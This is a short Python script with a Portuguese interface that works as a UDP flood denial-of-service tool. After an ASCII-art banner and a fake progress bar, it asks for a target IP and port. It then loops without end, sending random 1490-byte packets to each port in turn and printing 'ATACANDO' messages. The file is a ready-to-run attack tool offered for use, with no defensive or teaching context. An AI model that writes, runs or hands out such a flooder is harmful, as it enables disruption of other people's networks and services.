#-*- coding: utf-8 -*-
try:
    from time import sleep
    import os
    import socket
    import random
    import sys
except KeyboardInterrupt:
    print("Você saiu, obrigado!")
    sys.exit()


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

r = "\033[1;31m"
c = "\033[1;36m"
y = "\033[1;33m"

os.system("clear")

print()
print(c+"""
           _,.-------.,_
     ,;~'             '~;, 
   ,;                     ;,
  ;                         ;
 ,'                         ',
,;                           ;,
; ;      .           .      ; ;
| ;   ______       ______   ; | 
|  `/~"     ~" . "~     "~\'  |
|  ~  ,-~~~^~, | ,~^~~~-,  ~  |
 |   |        }:{        |   | 
 |   l       / | \       !   |
 .~  (__,.--" .^. "--.,__)  ~. 
 |     ---;' / | \ `;---     |  
  \__.       \/^\/       .__/  
   V| \                 / |V  
    | |T~\___!___!___/~T| |  
    | |`IIII_I_I_I_IIII'| |  
    |  \,III I I I III,/  |  
     \   `~~~~~~~~~~'    /
       \   .       .   /
         \.    ^    ./   
           ^~~~^~~~^ 
A L G H T A S 
         L I N U X

       ﷼«versão: 0.0.1»﷼
  Youtube : ALGHTAS PY
  Telefone ofc: +55 XX XXXX-XXXX
  Create by: ALGHTAS
  termux users: python alghtas.py
  cmd users: alghtas.py  \n\n""")
try:
    ip = input(c+" informe o ip: ")
    port = int(input(c+"coloque a porta: "))
except KeyboardInterrupt:
    print(r+"Você saiu, Até!")
    sys.exit()
    
os.system("clear")
print(y+"[                    ] 0%")
sleep(1)
os.system("clear")
print(y+"[#######             ] 25%")
sleep(1)
os.system("clear")
print(y+"[###########         ] 50%")
sleep(1)
os.system("clear")
print(y+"[##############      ] 75%")
sleep(1)
os.system("clear")
print(y+"[################### ] 99%")
sleep(1)
os.system("clear")
print(y+"[####################] 100")
sleep(3)
os.system("clear")
sent = 0    


while True:
    sock.sendto(bytes, (ip,port))
    sent = sent + 1
    port = port + 1
    print (r+"[•]%s ATACANDO %s PARA CANCELAR APERTE CRTL+C %s <<<>>>"%(sent,ip,port))


    if port == 65535:
        port = 1

try:
    print (r+"[•]%s ATACANDO %s PARA CANCELAR APERTE CRTL+C %s <<<>>>"%(sent,ip,port))
except KeyboardInterrupt:
    print(r+"Você saiu, obrigado!")